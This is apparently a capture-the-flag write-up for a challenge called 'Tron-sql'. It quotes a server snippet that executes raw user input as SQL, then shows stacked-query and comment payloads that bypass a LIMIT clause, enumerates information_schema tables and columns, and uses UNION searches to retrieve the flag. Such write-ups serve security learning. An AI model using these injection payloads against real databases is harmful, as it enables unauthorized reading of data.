# Tron-sql
> We've lost Tron on the grid, find him using this uplink!

## Server.py
- The goal is to find Tron, we're given the server.py.
- The server has the following lines:
```python
query_str = request.form['query']
results = query(query_str)

def query(query):
    cursor.execute(query + " ORDER BY name LIMIT 20;")
```
- This means that we can call sql commands by typing into the keyboard.
- Unfortunately there is a limit of 20 results.

## Enumeration
- In this case, MySQLdb allows multiple queries to combined in one execute() call so it can be bypassed by sending 2 queries separated by a semicolon.
```
# Query 1                                       ; Query 2
SELECT table_name FROM information_schema.tables; SELECT 1 from information_schema.tables
```
- Another way to do this is by adding a comment like so:
```
SELECT table_name FROM information_schema.tables; #
```

- Looking at all the table names:
```
CHARACTER_SETS
COLLATIONS
COLLATION_CHARACTER_SET_APPLICABILITY
COLUMNS
COLUMN_PRIVILEGES
ENGINES
EVENTS
FILES
GLOBAL_STATUS
GLOBAL_VARIABLES
KEY_COLUMN_USAGE
OPTIMIZER_TRACE
PARAMETERS
PARTITIONS
PLUGINS
PROCESSLIST
PROFILING
REFERENTIAL_CONSTRAINTS
ROUTINES
SCHEMATA
SCHEMA_PRIVILEGES
SESSION_STATUS
SESSION_VARIABLES
STATISTICS
TABLES
TABLESPACES
TABLE_CONSTRAINTS
TABLE_PRIVILEGES
TRIGGERS
USER_PRIVILEGES
VIEWS
INNODB_LOCKS
INNODB_TRX
INNODB_SYS_DATAFILES
INNODB_FT_CONFIG
INNODB_SYS_VIRTUAL
INNODB_CMP
INNODB_FT_BEING_DELETED
INNODB_CMP_RESET
INNODB_CMP_PER_INDEX
INNODB_CMPMEM_RESET
INNODB_FT_DELETED
INNODB_BUFFER_PAGE_LRU
INNODB_LOCK_WAITS
INNODB_TEMP_TABLE_INFO
INNODB_SYS_INDEXES
INNODB_SYS_TABLES
INNODB_SYS_FIELDS
INNODB_CMP_PER_INDEX_RESET
INNODB_BUFFER_PAGE
INNODB_FT_DEFAULT_STOPWORD
INNODB_FT_INDEX_TABLE
INNODB_FT_INDEX_CACHE
INNODB_SYS_TABLESPACES
INNODB_METRICS
INNODB_SYS_FOREIGN_COLS
INNODB_CMPMEM
INNODB_BUFFER_POOL_STATS
INNODB_SYS_COLUMNS
INNODB_SYS_FOREIGN
INNODB_SYS_TABLESTATS
known_isomorphic_algorithms     <-- These are unique to the db
programs                        <--
to_derezz                       <--
```

- To find column names we can use the information_schema.columns
```
SELECT column_name from information_schema.columns where table_name = 'programs'; SELECT 1 from programs
```

## Solving logic
- We can use wildcards to search through the tables like so
```
SELECT * from known_isomorphic_algorithms WHERE name LIKE '%tron%' UNION SELECT * FROM programs WHERE name LIKE '%tron%' UNION SELECT * FROM to_derezz WHERE name LIKE '%tron%'; SELECT 1 from programs
```


## Solution
```
SELECT * from programs where name like '%Tron%'
flag{I_fight_for_the_users_and_yori}
```
